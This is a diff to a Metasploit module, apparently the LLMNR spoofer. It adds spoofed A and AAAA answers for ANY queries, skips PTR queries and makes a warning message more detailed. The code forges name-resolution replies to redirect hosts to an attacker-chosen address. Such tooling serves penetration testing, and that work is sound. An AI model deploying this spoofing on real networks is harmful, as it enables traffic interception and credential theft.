@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -97,8 +97,27 @@ attr_accessor :sock, :thread
           :type => ::Net::DNS::AAAA,
           :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
         )
+      when ::Net::DNS::ANY
+        # For ANY queries, respond with both an A record as well as an AAAA.
+        dns_pkt.answer << ::Net::DNS::RR::A.new(
+          :name => name,
+          :ttl => datastore['TTL'],
+          :cls => ::Net::DNS::IN,
+          :type => ::Net::DNS::A,
+          :address => spoof.to_s
+        )
+        dns_pkt.answer << ::Net::DNS::RR::AAAA.new(
+          :name => name,
+          :ttl => datastore['TTL'],
+          :cls => ::Net::DNS::IN,
+          :type => ::Net::DNS::AAAA,
+          :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
+        )
+      when ::Net::DNS::PTR
+        # Sometimes PTR queries are received. We will silently ignore them.
+        next
       else
-        print_warning("#{rhost.to_s.ljust 16} llmnr - Unknown RR type, this shouldn't happen. Skipping")
+        print_warning("#{rhost.to_s.ljust 16} llmnr - Unknown RR type (#{question.qType.to_i}), this shouldn't happen. Skipping")
         next
       end
     end
